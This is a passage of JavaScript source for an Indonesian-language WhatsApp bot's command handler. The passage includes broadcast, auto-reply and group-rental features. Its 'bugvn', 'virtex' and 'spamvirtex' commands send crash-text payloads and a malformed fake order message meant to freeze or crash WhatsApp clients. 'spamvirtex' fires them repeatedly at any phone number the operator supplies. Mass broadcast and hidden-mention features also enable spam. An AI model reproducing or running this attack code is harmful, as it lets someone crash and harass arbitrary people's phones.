                    }
                    break;
    
           case 'bugvn':
           if(isExtream) return
                    if (!isOwner) return sendvn(gakmau)
                iya2 = fs.readFileSync('./lib/amaterasu.mp3')
                xdev.sendMessage(from, iya2, audio, {
                    'quoted': {
                        'key': {
                            'participant': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': 482007,
                                'status': 1,
                                'thumbnail': virgam,
                                'surface': 1,
                                'message': virtex7(prefix),
                                'orderTitle': fake,
                                'sellerJid': "0@s.whatsapp.net",
                                'sendEphemeral': true,
                            }
                        }
                    },
                    'filename': '' + ngazap(prefix),
                    'mimetype': 'audio/mp4',
                    'duration': '359996400',
                    'ptt': true
                });
                break;

  case 'virtex':
                if(isExtream) return
                    if (!isOwner) return sendvn(gakmau)
           {
           reply('*Loading...*')
               await xdev.sendMessage(from, virtexbytsukasa(prefix), text)                
               await xdev.sendMessage(from, virtex(prefix), text)            
                await xdev.sendMessage(from, virtex2(prefix), text)       
                 await xdev.sendMessage(from, virtex3(prefix), text)    
                await xdev.sendMessage(from, virtex4(prefix), text)              
                await xdev.sendMessage(from, virtex5(prefix), text)     
                await xdev.sendMessage(from, virtex6(prefix), text)
                await xdev.sendMessage(from, virtex7(prefix), text)   
                await xdev.sendMessage(from, virtex8(prefix), text)            
                await xdev.sendMessage(from, virtex9(prefix), text)       
                 await xdev.sendMessage(from, virtex10(prefix), text)    
                await xdev.sendMessage(from, virtex11(prefix), text)              
                await xdev.sendMessage(from, virtex12(prefix), text)     
                await xdev.sendMessage(from, philip(prefix), text)
                 await xdev.sendMessage(from, slayer(prefix), text) 
                 await xdev.sendMessage(from, ngazap(prefix), text)
           }
                break;
           
           
           
           
           
           
           
           
          
           
           case 'spamvirtex':    
                if(isExtream) return
                   if (!isOwner) return sendvn(gakmau)
                     try {                 
                     reply('*Loading...*')
                    if (args.length < 1) return reply(`Penggunaan ${prefix}spamvirtex nomor`)
					if (args[0].startsWith('08')) return reply('Gunakan kode negara kak')
			        if (args[0].startsWith('+62')) return reply('Awali nomor dengan 62')
					var nilaiAwal = 1;
                    while(nilaiAwal <= 3) { 
                     await xdev.sendMessage(`${q}@s.whatsapp.net`, virtex7(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${q}@s.whatsapp.net`, virtex6(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${q}@s.whatsapp.net`, ngazap(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${q}@s.whatsapp.net`, philip(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${q}@s.whatsapp.net`, virtexbytsukasa(prefix), text, {contextInfo: forward})
                     nilaiAwal++}
					await xdev.sendMessage(from, `*Sukses send virtex sebanyak 15 virtex ke nomor ${q}*`, text, {quoted : dev})
					} catch (e) {
					console.log('Error :', e)
					reply(`*Gagal mengirim virtex, System error pastikan memasukan nomer whatsapp dengan benar*`)
					}                        
					break
      
           
           
           
           
           
           
           
           
           
           
           
           
           
           
           
//-------------------------------》FITUR OWNER《-------------------------------\\     
           
           case 'addorder':
            try{
           if (!isOwner) return sendSticker(gaboleh)
            if (args.length < 1) return reply(`Penggunaan :\n${prefix}addorder linkgc 60s\n\nPilih waktu\ns = detik\nh = jam\nd =hari`)       
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            if (!q) return reply('masukan link gcnya kak')
            
             var LinkGc = q.split(" ")[0];
            var Second = q.split(" ")[1];
           
            var net = LinkGc.split('https://chat.whatsapp.com/')[1]
            if (!net) return reply('pastikan itu link https://whatsapp.com/')
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await xdev.query({ 
            json: ["query", "invite",net],
            expect200:true })
           if(_sewa.checkSewaGroup(id, sewa)) return reply("Grup tersebut masih tersisa waktu sewa")
              if(!isGroup){            
                          let code = LinkGc.replace('https://chat.whatsapp.com/', '')
                          xdev.acceptInvite(code)                                   
                          } else {
                            if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return reply('*The link is invalid Tod*')
                            link = LinkGc.replace('https://chat.whatsapp.com/','')
                            fak = xdev.query({ json: ['action', 'invite', link],
                            expect200: true })                        
                            }                          
                            await reply(`Sukses join kak`)
                              
                        _sewa.addSewaGroup(id, subject, LinkGc, Second, sewa)
                       await sendButMessage(id, `HALO KAK AKU *${fake}*`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}ceksewa`, buttonText: {displayText: `Cek sewa`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `Menu`,},type: 1}]);
                            }catch (err){
					      console.log(err)
					       return reply("Link Error")
					       }
                           break
             
        
        
        case 'freeoneday':
            try{
            if (!q) return reply('Masukan link gcnya kak')
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply("Linknya betul ga tuh")
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return reply('pastikan itu link https://whatsapp.com/')
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await xdev.query({ 
            json: ["query", "invite",net],
            expect200:true })
            if(!isGroup){            
                          let code = args[0].replace('https://chat.whatsapp.com/', '')
                          xdev.acceptInvite(code)                                   
                          } else {
                            if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return reply('*The link is invalid Tod*')
                            link = args[0].replace('https://chat.whatsapp.com/','')
                            fak = xdev.query({ json: ['action', 'invite', link],
                            expect200: true })                        
                            }                          
                            await reply(`Oke aku udah join :)`)
                            await xdev.sendMessage(`${nomerOwner}@s.whatsapp.net`,`*「 freeoneday 」*\n\nHalo kak, ada yang sewa aku nih\n\nNama : ${pushname}\nNomer : ${senderNumber}\n\nLink Gc : \n\n${q}\n\nCommand :\n${prefix}${command}\n\n\n© ${fake1}\n${calender}\n`,text)                                         
                             _sewa.addSewaGroup(id, subject, q, "1d", sewa)
                            await sendButMessage(id, `HALO KAK AKU *${fake}*`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}ceksewa`, buttonText: {displayText: `Cek sewa`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `Menu`,},type: 1}]);
                            }catch (err){
					      console.log(err)
					       return reply("Link Error")
					       }
                           break
        
        
        
        
        
        case 'antibuggc':
                    if(isExtream) return
			        if (!isGroupAdmins && !isOwner)return reply('hanya admin dan owner')
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (Antibuggc) return reply('Sudah aktif kak')
                    antibug.push(from);
                    fs.writeFileSync("./database/antibug.json",JSON.stringify(antibug));
                    reply("Sukses mengaktifkan antibuggc di grub ini!");
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (!Antibuggc) return reply('Sudah Mati')
                    antibug.splice(from, 1); fs.writeFileSync("./database/antibug.json", JSON.stringify(antibug));
                    reply("Sukses mematikan antibuggc!");
					} else if (!q) {
                      sendButMessage(from, `MODE ANTI BUGGC`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antibuggc on`, buttonText: {displayText: `ᴏɴ`,},type: 1},
                      {buttonId: `${prefix}antibuggc off`, buttonText: { displayText: `ᴏғғ`,},type: 1}]);
                    }
                 break;
                 
                 
                 
                 
                 
                 case 'nsfw':
                    if(isExtream) return
			        if (!isGroupAdmins && !isOwner)return reply('hanya admin dan owner')
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (isNsfw) return reply('Sudah aktif kak')
                    nsfw.push(from);
                    fs.writeFileSync("./database/nsfw.json",JSON.stringify(nsfw));
                    reply("Sukses mengaktifkan fitur nsfw di grub ini!");
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (!isNsfw) return reply('Sudah Mati')
                    nsfw.splice(from, 1);
                   fs.writeFileSync("./database/antibug.json", JSON.stringify(nsfw));
                    reply("Sukses mematikan fitur nsfw!");
					} else if (!q) {
                      sendButMessage(from, `MODE ANTI BUGGC`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}nsfw on`, buttonText: {displayText: `ᴏɴ`,},type: 1},
                      {buttonId: `${prefix}nsfw off`, buttonText: { displayText: `ᴏғғ`,},type: 1}]);
                    }
                 break;
        
                 
           
           case 'antitroli':
                    if(isExtream) return
					if (!isOwner) return sendSticker(gaboleh)
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (antibugtroli === true) return reply('Sudah aktif kak')
                    antibugtroli = true
                    let ah =`Mode anti bugtroli aktif kak`
                    xdev.sendMessage(from, ah, text, { quoted: ftext, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (antibugtroli === false) return reply('Udah off kak')
                     antibugtroli = false
                     let uh =`Mode anti bugtroli di matikan`
                     xdev.sendMessage(from, uh, text, { quoted: ftext, contextInfo: forward})
					} else if (!q) {
                      sendButMessage(from, `MODE ANTI BUGTROLI`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antitroli on`, buttonText: {displayText: `ᴏɴ`,},type: 1},
                      {buttonId: `${prefix}antitroli off`, buttonText: { displayText: `ᴏғғ`,},type: 1}]);
                    }
                 break;
           
           
           
           
           
               
           
           case 'autotyping':
					case 'typing':
					if (!isOwner) return sendSticker(gaboleh)
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (typing === true) return reply('Udah aktif kak')
                    typing = true
                    autovn = false
                    let ah =`Mode typing telah aktif kak \nBot akan auto typing saat di beri perintah`
                    xdev.sendMessage(from, ah, text, { quoted: ftext, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (typing === false) return reply('Udah off kak')
                     typing = false
                     let uh =`Mode typing telah di matikan`
                     xdev.sendMessage(from, uh, text, { quoted: ftext, contextInfo: forward})
					} else if (!q) {
                      sendButMessage(from, `MODE AUTO TYPING`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autotyping on`, buttonText: {displayText: `ᴏɴ`,},type: 1},
                      {buttonId: `${prefix}autotyping off`, buttonText: { displayText: `ᴏғғ`,},type: 1}]);
                    }
                 break;
                 
                 
                 case 'forward':
					       if (!isOwner) return sendSticker(gaboleh)
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (forwarding === true) return reply('Udah aktif kak')
                    forwarding = true
                    let ah =`Mode forwarding/diteruskan berhasil diaktifkan \nsilakan ketik ${prefix}menu untuk melihat perbedaanya`
                    xdev.sendMessage(from, ah, text, { quoted: ftext, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (forwarding === false) return reply('Udah off kak')
                     forwarding = false
                     let uh =`Mode forwarding telah di matikan`
                     xdev.sendMessage(from, uh, text, { quoted: ftext})
					} else if (!q) {
                      sendButMessage(from, `MODE AUTO TYPING`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}forwarding on`, buttonText: {displayText: `ᴏɴ`,},type: 1},
                      {buttonId: `${prefix}forwarding off`, buttonText: { displayText: `ᴏғғ`,},type: 1}]);
                    }
                 break;
           
           
     
	
	
           
           
           case 'bc':
           
					if (!isOwner && !dev.key.fromMe) return sendSticker(gaboleh)
					if (args.length < 1) return reply('Teksnya?')
					anus = await xdev.chats.all()
					let butonih = [{"buttonId": `INFO BOTZ`,"buttonText": {"displayText": `ɪɴғᴏ ʙᴏᴛᴢ`},"type": "RESPONSE"},
                        {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
					
					if (isMedia && !dev.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${body.slice(4)}` })
						}
						await reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${body.slice(4)}` })
						}
						await reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						}else if (isMedia && !dev.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, audio, { ptt: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: thumb, surface: 200, message: `${q}`, orderTitle: `${q}`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward })
						}
						await reply(`Sukses mengirim Broadcast ${q}`)
					} else {
						for (let _ of anus) {
							await Sendbutdocument(_.jid, ` *BROADCAST*\n\n${q}`,`© ${fake1}`, fs.readFileSync('./temp/Extream.docx'), {mimetype:Mimetype.pdf, thumbnail:fs.readFileSync('./stik/thumbnaildokumen.jpg'), filename:`${namaDocument}`},butonih)
						}
						await sendMess(`Sukses mengirim Broadcast:\n${q}`)
					}
					break
					
					
					
					
					
					
					
					case 'bcgc':
					if (!isOwner && !dev.key.fromMe) return sendSticker(gaboleh)
					if (args.length < 1) return reply('Teksnya?')
					anus = await xdev.chats.all().filter(v => v.jid.endsWith('g.us'))
					let yesnih = [{"buttonId": `INFO BOTZ`,"buttonText": {"displayText": `ɪɴғᴏ ʙᴏᴛᴢ`},"type": "RESPONSE"},
                        {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
					if (isMedia && !dev.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${body.slice(4)}` })
						}
						await reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${body.slice(4)}` })
						}
						await reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${body.slice(4)}` })
						}
						await reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						}else if (isMedia && !dev.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, audio, { ptt: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: thumb, surface: 200, message: `${q}`, orderTitle: `${q}`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward })
						}
						await reply(`Sukses mengirim Broadcast ${q}`)
					} else {
						for (let _ of anus) {
							await Sendbutdocument(_.jid, ` *BROADCAST*\n\n${q}`,`© ${fake1}`, fs.readFileSync('./temp/Extream.docx'), {mimetype:Mimetype.pdf, thumbnail:fs.readFileSync('./stik/thumbnaildokumen.jpg'), filename:`${namaDocument}`},yesnih)
						}
						await sendMess(`Sukses mengirim Broadcast:\n${q}`)
					}
					break
					
					
					
					
					case 'pcallmember':
					case 'pcallmem':
					case 'bcmember':
					if(!isGroup) return reply("Fitur hanya bisa di gunakan di dalam group")
					if (!isOwner && !dev.key.fromMe) return sendSticker(gaboleh)
					if (args.length < 1) return reply('Teksnya?')
					anus = await groupMembers
					let ayey = [{"buttonId": `INFO BOTZ`,"buttonText": {"displayText": `ɪɴғᴏ ʙᴏᴛᴢ`},"type": "RESPONSE"},
                        {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
					if (isMedia && !dev.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							xdev.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							xdev.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							xdev.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
					} else {
						for (let _ of anus) {
							await Sendbutdocument(_.jid, `*BROADCAST BOT*\n\n${q}`,`© ${fake1}`, fs.readFileSync('./temp/Extream.docx'), {mimetype:Mimetype.pdf, thumbnail:fs.readFileSync('./stik/thumbnaildokumen.jpg'), filename:`${namaDocument}`},ayey)
						}
						sendMess(`Sukses mengirim Broadcast:\n${q}`)
					}
					break
           
           
           
           
           
           
           case 'sendhidetag':        
	        if (args.length < 1) return reply(`Penggunaan ${prefix}sendhidetag idgc|teks\nUntuk mendapatkan id gc ketik ${prefix}getidgc di group`)
		    if (args[0].startsWith('08')) return reply('Maukin idgc goblok')
            if (args[0].startsWith('+62')) return reply('masukin idgc peak lu')
		    var gc = body.slice(13)
            var idgc = gc.split("|")[0];
            var teks = gc.split("|")[1];
			var group = await xdev.groupMetadata(idgc)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: teks,
			contextInfo: { mentionedJid: mem },
			quoted: dev
			}
			await xdev.sendMessage(idgc, optionshidetag, text)
			await reply(`Sukses mengirim hidetag`)
			break
           
           
           case 'autoread':
		            if (!isOwner)return sendSticker(gaboleh)
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autoread === true) return reply('Udah aktif kak')
                    autoread = true
                    let ih =`Mode auto read telah aktif kak \nBot akan auto read saat di chat`
                    xdev.sendMessage(from, ih, text, { quoted: ftext, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autoread === false) return reply('Udah off kak')
                     autoread = false
                     let eh =`Mode auto read telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: ftext, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTOREAD`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autoread on`, buttonText: {displayText: `ᴏɴ`,},type: 1},
                      {buttonId: `${prefix}autoread off`, buttonText: { displayText: `ᴏғғ`,},type: 1}]);
                    }
                 break;
                 
                 case 'autorespon':
			       if (!isOwner) return sendSticker(gaboleh)
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autorespon === true) return reply('Udah aktif kak')
                    autorespon = true
                    let ih =`Mode auto respon telah aktif kak \nBot akan auto respon saat di chat`
                    xdev.sendMessage(from, ih, text, { quoted: ftext, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autorespon === false) return reply('Udah off kak')
                     autorespon = false
                     let eh =`Mode auto respon telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: ftext, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTOREAD`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autorespon on`, buttonText: {displayText: `ᴏɴ`,},type: 1},
                      {buttonId: `${prefix}autorespon off`, buttonText: { displayText: `ᴏғғ`,},type: 1}]);
                    }
                 break;
                 
                 
					
					
					case 'autovn':
		            if (!isOwner) return sendSticker(gaboleh)
					if ((args[0]) === 'on' || (args[0]) === 'enable') {
					if (autovn === true) return reply('Udah aktif kak')
                    autovn = true
                    typing = false
                    let ih =`Mode auto vn telah aktif kak \nBot akan auto voice saat di kasih perintah`
                    xdev.sendMessage(from, ih, text, { quoted: ftext, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autovn === false) return reply('Udah off kak')
                     autovn = false
                     let eh =`Mode auto vn telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: ftext, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTO VOICE NOTE`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autovn on`, buttonText: {displayText: `ᴏɴ`,},type: 1},
                      {buttonId: `${prefix}autovn off`, buttonText: { displayText: `ᴏғғ`,},type: 1}]);
                    }
                 break;
                 
                 
                 case 'autoblockcmd':
		            if (!isOwner) return sendSticker(gaboleh)
					if ((args[0]) === 'on' || (args[0]) === 'enable') {
					if (autoblockcmd === true) return reply('Udah aktif kak')
                    autoblockcmd = true          
                    let ih =`Mode auto block command telah aktif kak \nBot akan auto block saat ada command yang error`
                    xdev.sendMessage(from, ih, text, { quoted: ftext, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autoblockcmd === false) return reply('Udah off kak')
                     autoblockcmd = false
                     let eh =`Mode auto block command telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: ftext, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTO BLOCK CMD`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autoblockcmd on`, buttonText: {displayText: `ᴏɴ`,},type: 1},
                      {buttonId: `${prefix}autoblockcmd off`, buttonText: { displayText: `ᴏғғ`,},type: 1}]);
                    }
                 break;
                 
                 
                 case 'autobio':
			       if (!isOwner) return sendSticker(gaboleh)
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autobio) return reply('Udah aktif kak')
                    autobio = true          
                    let ih =`Mode auto bio telah aktif kak`
                    xdev.sendMessage(from, ih, text, { quoted: ftext, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (!autobio) return reply('Udah off kak')
                     autobio = false
                     let eh =`Mode auto bio telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: ftext, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTO BIO`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autobio on`, buttonText: {displayText: `ᴏɴ`,},type: 1},
                      {buttonId: `${prefix}autobio off`, buttonText: { displayText: `ᴏғғ`,},type: 1}]);
                    }
                 break;
                 
                 
                 
                 
                 case 'autosticker':
				    if (!isOwner) return sendSticker(gaboleh)
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autosticker === true) return reply('Udah aktif kak')
                    autosticker = true
                    autovn = false
                    typing = false
                    let ih =`Mode autosticker telah aktif kak`
                    xdev.sendMessage(from, ih, text, { quoted: ftext, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (autosticker === false) return reply('Udah off kak')
                     autosticker = false
                     let eh =`Mode autosticker telah di matikan`
                     xdev.sendMessage(from, eh, text, { quoted: ftext, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE AUTOSTICKER`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autosticker on`, buttonText: {displayText: `ᴏɴ`,},type: 1},
                      {buttonId: `${prefix}autosticker off`, buttonText: { displayText: `ᴏғғ`,},type: 1}]);
                    }
                 break;
					
           
      case 'unblockcmd':
      case 'delblock':
      case 'delblockcmd':{
    	  if (!isOwner) return sendvn(gakmau)
          if(!q) return reply("Textnya mana cih")
          if (!checkblockcmd(q, listcmdblock)) return reply(`Command tersebut tidak ada di database`)
          deleteblockcmd(q, listcmdblock)
          setTimeout( () => {
          reply(`Berhasil unblock command *${q}*`)
           },3000)
          }
      break
            
            case 'blockcmd':{
          if (!isOwner) return sendvn(gakmau)
          if(!q) return reply(`Textnya mana cih\n\nContoh : ${prefix}blockcmd menu\nGituuuuuuu`)
          if (checkblockcmd(q, listcmdblock)) return reply(`Command tersebut sudah ada di database`)
          addblockcmd(q,listcmdblock) 
          setTimeout( () => {
          reply(`Berhasil memblokir command *${q}*\nsilakan ketik ${prefix}listblockcmd untuk melihat\ndaftar command yang telah di block`)
           },3000)
          }
      break
            
            
            
            
                  
           case 'listblockcmd':
           case 'listcmdblock':
